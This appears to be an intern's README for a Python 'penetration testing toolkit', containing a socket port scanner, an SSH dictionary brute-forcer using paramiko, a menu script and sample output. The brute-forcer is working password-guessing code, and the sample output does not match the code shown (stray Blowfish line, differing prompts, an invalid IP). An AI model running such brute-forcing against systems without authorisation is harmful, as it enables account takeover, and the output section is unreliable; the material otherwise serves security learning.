# PENETRATION-TESTING-TOOLKIT
Penetration Testing Toolkit is a collection of essential tools used by ethical hackers to identify and exploit security vulnerabilities in networks, systems, and applications. It helps organizations strengthen their cybersecurity defenses through simulated real-world attacks.

*COMPANY* : CODETECH IT SOLUTIONS
*NAME* : SAKSHI SANTOSH ZURANGE
*Intern ID* : CT12WNYF
*DOMAIN* :  Cyber Security & Ethical Hacking.
*DURATION* : January 20th, 2025 to April 20th, 2025
*MENTION* : Neela Santhosh Kumar

...........PENETRATION TESTING TOOLKIT...........

Toolkit Name: PyPenTest Toolkit
Goal: Develop a modular penetration testing toolkit in Python that includes a port scanner, brute-force attacker, and more. Each module can be executed independently.

TOOLKIT STRUCTURE
PyPenTest/
├── modules/
│   ├── port_scanner.py
│   ├── brute_forcer.py
│   └── __init__.py
├── main.py
├── README.md
└── requirements.txt

MODULES
1 Port Scanner
  Scans for open ports on a target host.
2 Brute Forcer
  Performs dictionary attacks against services (e.g., SSH, FTP).
3 (Optional future modules:)
  Directory/File Enumerator
  Vulnerability Scanner
  Network Sniffer

# PORT SCANNER
import socket

def port_scanner(target, ports):
    print(f"\n[+] Scanning Target: {target}")
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[OPEN] Port {port}")
            sock.close()
        except KeyboardInterrupt:
            print("\n[-] Scan interrupted by user.")
            break
        except Exception as e:
            print(f"Error scanning port {port}: {e}")
# BRUTE FORCER
import paramiko

def ssh_brute_force(target, username, password_list):
    print(f"\n[+] Starting SSH Brute Force on {target} with user '{username}'")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=3)
            print(f"[SUCCESS] Password found: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[FAILED] {password}")
        except Exception as e:
            print(f"[ERROR] {e}")
    print("[-] Brute force completed. No valid password found.")
# MAIN PROGRAM
from modules import port_scanner, brute_forcer

def main():
    print("=== PyPenTest Toolkit ===")
    print("1. Port Scanner")
    print("2. SSH Brute Forcer")
    
    choice = input("Select a module (1-2): ")

    if choice == "1":
        target = input("Enter target IP: ")
        ports = [21, 22, 23, 80, 443, 8080]  # Customize as needed
        port_scanner.port_scanner(target, ports)
    
    elif choice == "2":
        target = input("Enter target IP: ")
        username = input("Enter SSH username: ")
        password_file = input("Enter path to password list: ")

        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]

        brute_forcer.ssh_brute_force(target, username, passwords)

    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
.............OUTPUT.....................
 "class": algorithms.Blowfish,
=== Penetration Testing Toolkit ===
1. Port Scanner
2. SSH Brute Forcer
Select a module (1-2): 1
Enter target IP address: 127.0.0.8080
Enter comma-separated ports (default 21,22,80,443): 22,80,8080

[+] Scanning Target: 127.0.0.8080
[ERROR] Scanning port 22: [Errno 11001] getaddrinfo failed
[ERROR] Scanning port 80: [Errno 11001] getaddrinfo failed
[ERROR] Scanning port 8080: [Errno 11001] getaddrinfo failed

